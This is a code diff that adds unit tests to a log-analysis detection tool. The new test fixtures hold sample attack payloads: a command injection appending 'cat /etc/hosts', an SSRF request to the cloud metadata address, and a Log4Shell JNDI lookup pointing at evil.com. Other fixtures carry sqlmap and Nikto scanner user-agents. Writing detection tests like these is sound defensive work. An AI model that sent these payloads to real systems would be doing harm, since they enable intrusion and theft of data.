@@ -5,6 +5,7 @@ import { httpErrorBurst } from './detectors/httpErrorBurst';
 import { endpointEnum } from './detectors/endpointEnum';
 import { offHours } from './detectors/offHours';
 import { payloadSignatures } from './detectors/payloadSignatures';
+import { scannerUa } from './detectors/scannerUa';
 import { runProfiles } from './profiles';
 
 /** 6 failed logins from .66 inside 60s, plus noise from other IPs. */
@@ -161,9 +162,52 @@ describe('payloadSignatures', () => {
     expect(findings.find((f) => f.detail.includes('SQL injection'))?.count).toBe(2);
   });
 
+  it('flags command-injection, SSRF and Log4Shell payloads', () => {
+    const ds = makeDataset(
+      [
+        { name: 'url', type: 'string' },
+        { name: 'client_ip', type: 'string' },
+      ],
+      [
+        ['/ping?host=8.8.8.8; cat /etc/hosts', '10.0.0.1'],
+        ['/fetch?u=http://169.254.169.254/latest/meta-data', '10.0.0.1'],
+        ['/api?x=${jndi:ldap://evil.com/a}', '10.0.0.1'],
+      ],
+    );
+    const details = payloadSignatures(ds, allRows(ds)).map((f) => f.detail).join(' | ');
+    expect(details).toContain('Command injection');
+    expect(details).toContain('SSRF');
+    expect(details).toContain('Log4Shell');
+  });
+
   it('no-ops when there is no request/url column', () => {
     const ds = makeDataset([{ name: 'level', type: 'string' }], [['INFO'], ['ERROR']]);
     expect(payloadSignatures(ds, allRows(ds))).toEqual([]);
+  });
+});
+
+describe('scannerUa', () => {
+  it('flags known scanner user-agents per source', () => {
+    const ds = makeDataset(
+      [
+        { name: 'user_agent', type: 'string' },
+        { name: 'client_ip', type: 'string' },
+      ],
+      [
+        ['sqlmap/1.7', '45.9.1.7'],
+        ['Mozilla/5.0', '10.0.0.7'],
+        ['Nikto/2.5.0', '45.9.1.7'],
+      ],
+    );
+    const findings = scannerUa(ds, allRows(ds));
+    expect(findings).toHaveLength(2); // sqlmap + nikto, both from .7
+    expect(findings.every((f) => f.entity === '45.9.1.7')).toBe(true);
+    expect(findings.every((f) => f.rule === 'scanner-tool')).toBe(true);
+  });
+
+  it('no-ops without a user-agent column', () => {
+    const ds = makeDataset([{ name: 'level', type: 'string' }], [['INFO']]);
+    expect(scannerUa(ds, allRows(ds))).toEqual([]);
   });
 });
 
